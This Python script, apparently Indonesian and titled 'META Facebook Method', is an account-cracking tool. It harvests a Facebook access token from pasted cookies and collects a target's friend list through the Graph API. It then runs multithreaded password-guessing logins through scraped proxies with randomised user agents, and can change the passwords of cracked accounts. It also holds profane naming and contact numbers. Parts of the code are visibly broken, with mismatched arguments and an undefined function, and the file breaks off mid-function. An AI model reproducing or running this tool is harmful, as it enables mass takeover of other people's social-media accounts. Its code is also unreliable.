# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Yayan XD.
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
tokenku = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
###########################################################################################
hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
###########################################################################################
## RANDOM UA
#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
# lempankkkkkkkk
ugen2=[]
ugen=[]

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)

for xd in range(10000):
    a='Mozilla/5.0 (linux; android 4.4.2;'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='mito'
    e=random.randrange(100, 9999)
    f='a250 build/kot49h) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.0.0'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='mobile safari/537.36 bdbrowser/6.4.0.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (linux; android 4.4.2;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='mito a250 build/kot49h)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='30.0.0.0 mobile safari/537.36 bdbrowser/6.4.0.4'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
     

   
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
# LOGO
def logo():
    print(f"""{M}
 ███╗   ███╗███████╗████████╗ █████╗
 ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗
 ██╔████╔██║█████╗     ██║   ███████║
 ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║
 ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║META FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : Muhammad-Andik                   {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +62895328271984          {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/Muhammad-Andik{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : Gratis rasa {H}Premium{P}     {N}║")
    print(f"║{P}[{H}•{P}] Support   : 64bit                   {N}║")
    print(f"║{P}[{H}•{P}] Network   : {H}IM3{N}, {H}AXIS/XL{N}, {H}3{N}         ║")
    print(f"║{P}[{H}•{P}] SC Version: V-5.0 ({K}BETA{P})            {N}║")
    print("╚════════════════════════════════════════╝")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY ANDIK META SC SELESAI...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(N,H,N,H,str(len(ok)),N))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(K,N,K,str(len(cp)),N))
        cek_cp = input(f"{N}══════════════════════════════════════════\n [{K}?{N}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}admin123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[Ndikz-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[Ndikz-CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python run.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()
#LOGIN SC
user = "meta"
pwas = "metaroyid"
def cek_pw():
    try:
        open(".ini_pw.txt", "r").read()
    except FileNotFoundError:
        os.system("clear")
        logo()
        print(' [%s!%s] Pilih nomer 2 jika ada yang memperjual\n belikan SC META. SC ini %sGRATIS%s'%(M,N,H,N))
        print('\n %s%sOPTION MENU%s'%(BM,P,N))
        print(' [%s1%s] Already have SC Login Info'%(H,N))
        print(' [%s2%s] Send a message to the Author'%(H,N))
        pil = input('\n %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Sorry, it is wrong...!");time.sleep(1);cek_pw()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/601160610812?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
            print(' %s[%s!%s] You must have a %susername & password%s to\n continue with this tool!'%(N,M,N,H,N))
        else:
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        #print(" %s[%s!%s] You must have a %susername & password%s to continue with this tool!"%(N,M,N,K,N))
        pw = input("\n %s[%s?%s] Enter Username : %s"%(N,K,N,H))
        loading()
        if pw in [""]:
            jalan(" %s[%s!%s] Sorry don't be blank!"%(N,M,N));time.sleep(1);cek_pw()
        elif pw in user:
            jalan(" %s[%s✓%s] OK Username is correct"%(N,H,N));time.sleep(1);kska()
        else:
            jalan(" %s[%s!%s] Sorry, wrong username"%(N,M,N));time.sleep(1);cek_pw()
    moch_yayan()
def kska():
    xx = input("\n %s[%s?%s] Enter Password : %s"%(N,K,N,H))
    loading()
    if xx in[""]:
        jalan(" %s[%s!%s] Sorry don't be blank!"%(N,M,N));time.sleep(1);cek_pw()
    elif xx in pwas:
        jalan(" %s[%s✓%s] OK Password is correct"%(N,H,N));time.sleep(2);open(".ini_pw.txt", "a").write(xx);moch_yayan()
    else:
        jalan(" %s[%s!%s] Sorry, wrong Password"%(N,M,N));time.sleep(1);cek_pw()

#METODE LOGIN
def yayanxd():
    os.system('clear')
    try:
    	___kontol___ = input('[|] Masukkan Cookies : ')
    	data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___})
    	find_token = re.search("(EAAG\w+)", data.text)
    	ken=open(".token.txt", "w").write(find_token.group(1))
    	cok=open(".cokie.txt", "w").write(___kontol___)
    	print('\n LOGIN SUCCESSFULLY')
    	exit()
    except Exception as e:
    	os.system("rm -f .token.txt")
    	os.system("rm -f .cokie.txt")
    	print('invalid')
    	exit()
# ------- LOGIN COOKIE --------
def login():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cokie.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':kukis})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			moch_yayan(sy2,sy3)
		except KeyError:
			yayanxd()
		except requests.exceptions.ConnectionError:
				yayanxd()
	except IOError:
			yayanxd()
#LOGIN PASSWORD

    
def moch_yayan(my_name,my_id):
    
 
    print(' %s01%s:crak dari publik %s%s'%(H,H,H,H));time.sleep(0.03)
    print(' %s02%s:chek hasil crak %sOF%s'%(N,N,N,BM));time.sleep(0.03)
    pepek = input('\n %s%s%s pilih: '%(N,K,N))
    if pepek == '':
        jalan('\n %s[%s×%s] pilih yang bener kontol cuma ada 1/2 memek😒'%(N,M,N));time.sleep(2);moch_yayan()
###### CRACK ID PUBLIK #####
    elif pepek in['1','01']:
        try:
        	token = open('.token.txt','r').read()
        	kukis = open('.cokie.txt','r').read()
        except IOError:
        	exit()        
        pil = input("target?:")
        try:
        	koh2 = open('/sdcard/PKG.txt','a+')
        	for pi in requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()['friends']['data']:
                		uid = pi["id"]
                		nama = pi["name"]
                		id.append(pi['id']+'<=>'+pi['name'])
                		koh2.close()
        except KeyError:
            jalan(f' %s[%s×%s] Sorry %sID is not public/Invalid token%s'%(N,M,N,M,N));time.sleep(1);login()
###### CEK HASIL CRACK #####
    elif pepek in['2','02']:
        dirs = os.listdir("results")
        for file in dirs:
            print(" %s[%s%s] %s"%(N,H,N,file))
        file = input("\n %s%sPILIH FILE MANA%s\n [%s?%s] File name : %s"%(M,P,N,K,N,H))
        if file == "":
            file = input("\n %s%sCHEK FILE %s\n %s%s NAMA FILE?:%s"%(N,P,N,K,N,H))
        total = open("results/%s"%(file)).read().splitlines()
        
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" %s[%s%s] DATA FILE:%s%s\n %s[%s%s] TOTAL CHEK : %s%s%s"%(N,H,N,H,hps_nm,N,H,N,H,len(total),N))
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[LIVE] ","\x1b[1;92m[LIVE] ").replace("[CHEK] ", "\x1b[1;93m[CHEK] ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        jalan("\n %s[%s✓%s] File check complete..."%(N,H,N))
        input(' [%sPRESS ENTER%s] to continue'%(H,N));moch_yayan()
###### HAPUS COOKIE #####
    elif pepek in['0','00']:
        print("")
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s!%s] Deleting Token/Cookie %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        jalan('\n %s[%s✓%s] %sSuccessfully delete Token/Cookie...'%(N,H,N,H))
        jalan('\n %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
    else:
        jalan('\n %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
    return __crack__().plerr(id)



# CRAKER 
class __crack__:

    def __init__(self):
        self.id = []
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        
        crot = input(f" {B}[{B}{B}] sebelum lanjut masukan pasword script: {B}")
       
        crot = input(f" {N} INGIN MENAMPILKAN APK?[{M}y{M}/{H}n{N}]: ")
        if crot in[""]:
            print(f" {N}[{M}×{N}] Don't be empty");self.tampilkan_apk()
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["N","n"]:
            Apk.append("t")
        else:
            #jalan(f" {N}[{M}×{N}] Sorry, wrong username");self.tampilkan_apk()
            print(f" {N}[{M}{N}] pilihy/t");self.tampilkan_apk()
# METODE SANDI MANUAL
    def plerr(self,id):
        self.id = id
        print(f'\n %s[%s✌%s] BERHASIL TERKUMPUL: %s%s%s' %(H,H,H,H,len(self.id),N))
        ___yayanganteng___ = input('%s══════════════════════════════════════════\n %s%s masukan pasword script unutuk ke 2 kali nya (%senter%s) : %s'%(M,M,M,M,M,M))
        if ___yayanganteng___ in ('ridwan', 'ridwan'):
            self.tampilkan_apk()
            print('%s══════════════════════════════════════════\n %sMANUAL PASSWORD DETAILS%s'%(N,H,H))
            print(' %s[%s!%s] Use %sKOMMA%s for separator\n [%s•%s] Example : %sandik123%s,%ssayang%s,%sbismillah'%(N,M,N,H,N,H,N,H,N,H,N,H))
            while True:
                pwek = input(' %s[%s?%s] Enter password : %s'%(N,K,N,H))
                print(' %s[%s•%s] Active Password : %s%s%s' % (N,H,N,H, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n %s[%s%s] pilih : '%(N,K,N))
                        if cin == '':
                            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));__yan__()
                        elif cin == '1':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%s]ANDA MENGUNAKAN USER-AGENT INI:{uaku}\n══════════════════════════════════════════'%(N,H,N,M,H,H,H,H,H))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%s]anda sedang mengunakan user-agent ini:{uaku}\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%sANDA SEKARANG MENGUNAKAN USER-AGENT:{uaku}\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print(' [%s×%s] Sorry, it is wrong...!'%(N,M,N));__yan__()
                    mentod()
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('bgs'):
            self.tampilkan_apk()
            
            self.__pler__()
        else:
            jalan(' %s[%s×%s] Sorry, wrong SC Password'%(N,M,N));self.plerr(id)
            #print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.plerr(id)
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;97m[OPEN]"])
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}{N}OK:{len(ok)}{N}\\{N}CP:{len(cp)}{N}  [{N}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:os.mkdir('results')
        except:pass
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                #ua1 = random.choice(agen1)
                #ua2 = random.choice(agen2)
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
